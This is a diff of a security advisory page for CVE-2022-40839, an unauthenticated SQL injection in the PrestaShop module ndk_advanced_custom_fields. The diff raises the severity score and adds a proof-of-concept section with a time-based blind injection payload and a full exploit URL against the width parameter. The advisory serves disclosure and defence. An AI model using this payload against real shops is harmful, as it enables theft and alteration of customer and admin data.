@@ -4,8 +4,8 @@ title: "[CVE-2022-40839] Improper neutralization of SQL parameter in NdkAdvanced
 categories: module
 author:
 - Friends-Of-Presta.org
-meta: "CVE,PrestaShop,ndkadvancedcustomizationfields"
-severity: "high (7.5)"
+meta: "CVE,PrestaShop,ndk_advanced_custom_fields"
+severity: "critical (9.8)"
 ---
 
 A SQL injection vulnerability in the height and width parameter in NdkAdvancedCustomizationFields v3.5.0 allows unauthenticated attackers to exfiltrate database data.
@@ -14,13 +14,13 @@ A SQL injection vulnerability in the height and width parameter in NdkAdvancedCu
 
 * **CVE ID**: [CVE-2022-40839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40839)
 * **Published at**: 2022-11-01
-* **Advisory source**: [github](https://github.com/daaaalllii/cve-s/blob/main/CVE-2022-40839/poc.txt)
+* **Advisory source**: [@daaaalllii](https://github.com/daaaalllii/cve-s/blob/main/CVE-2022-40839/poc.txt)
 * **Vendor**: PrestaShop
-* **Product**: NdkAdvancedCustomizationFields
+* **Product**: ndk_advanced_custom_fields
 * **Impacted release**: <= 3.5.0
-* **Product author**: 
+* **Product author**: ndk design
 * **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
-* **Severity**: high (7.5)
+* **Severity**: critical (9.8)
 
 ## Description
 
@@ -32,10 +32,10 @@ A SQL injection vulnerability in the height and width parameter in NdkAdvancedCu
 * **User interaction**: none
 * **Scope**: unchanged
 * **Confidentiality**: high
-* **Integrity**: none
-* **Availability**: none
+* **Integrity**: high
+* **Availability**: high
 
-**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
 
 ## Possible malicious usage
 
@@ -43,6 +43,18 @@ A SQL injection vulnerability in the height and width parameter in NdkAdvancedCu
 * Remove data from the associated PrestaShop
 * Copy/paste data from sensitive tables to FRONT to exposed tokens and unlock admins's ajax scripts
 * Rewrite SMTP settings to hijack emails
+
+## Proof of concept
+
+Parameters: height,width
+
+Payload: 1' AND (SELECT 6330 FROM (SELECT(SLEEP(5)))pQfS) AND 'dpZV'='dpZV
+
+Exploit:
+```
+http://localhost/modules/ndk_advanced_custom_fields/front_ajax.php?action=getRangePrice&group=19&width=1' AND (SELECT 6330 FROM (SELECT(SLEEP(5)))pQfS) AND 'dpZV'='dpZV&height=1
+```
+
 
 ## Patch
 
